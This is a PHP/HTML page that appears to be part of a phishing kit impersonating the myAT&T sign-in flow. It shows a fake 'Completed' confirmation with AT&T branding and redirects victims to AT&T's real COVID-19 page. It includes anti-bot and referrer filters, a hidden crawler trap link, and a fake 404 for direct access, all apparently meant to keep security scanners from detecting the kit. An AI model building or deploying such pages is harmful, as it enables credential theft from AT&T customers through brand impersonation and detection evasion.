<?php
  $_SESSION['nonce'] = rand();
  echo '<input type="hidden" name="nonce" value="'.$_SESSION['nonce'].'">';
?>
<?php 
include 'hidden.php';

$currentPage = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if ($_SERVER['REQUEST_METHOD'] == "GET" && strcmp(basename($currentPage), basename(__FILE__)) == 0)
{
    http_response_code(404);
    include('err0r.php'); // provide your own 404 error page
    die(); /* remove this if you want to execute the rest of
              the code inside the file before redirecting. */
}
include 'anoxytytrap/bot.php';
include 'anoxytytrap/ref.php';
define('Myheader', TRUE);
?>
<?php include 'layers/header.php' ?>
<meta http-equiv="refresh" content="5;URL='https://about.att.com/pages/COVID-19.html'" /> 
<body>

	
  <div id="app-root" _nghost-rbp-c0="" ng-version="7.2.15"><div _ngcontent-rbp-c0=""><div _ngcontent-rbp-c0="" class="container-fluid" role="main"><div _ngcontent-rbp-c0="" class="d-flex flex-container Card"><app-header _ngcontent-rbp-c0="" class="d-flex flex-container" _nghost-rbp-c1=""><div _ngcontent-rbp-c1="" class="image" style="width: 65px;"><img _ngcontent-rbp-c1="" alt="AT&amp;T logo image" class="mar-b4 header-logo-image" id="headerLogoImage" style="width: 100%;" src="assets/img/logo.svg"></div><h1 _ngcontent-rbp-c1="" class="sign-in-header justify-content-center mb-0" id="signInHeaderText" style="margin-top: 20px;">Completed</h1><h1 _ngcontent-rbp-c1="" class="DIRECTV-NOW-Text justify-content-center mt-0" id="signInHeaderToText">to myAT&amp;T</h1>
  
  <br/>
  <div class="ng-tns-c3-0 ng-pristine ng-invalid ng-touched">
  <p>Please wait you will be redirected to the COVID-19: Our Response page in 5 seconds</p>
    <br/>
  <img  src="assets/img/cong.gif" width="100px" height="100px"style="align:center;">
    <br/>
  </div>
  
		<a style="display:none" href="anoxytytrap">Trap</a>

  </app-manual-login><!----><!----></div></div><!---->
  <?php include'layers/foot.php' ?>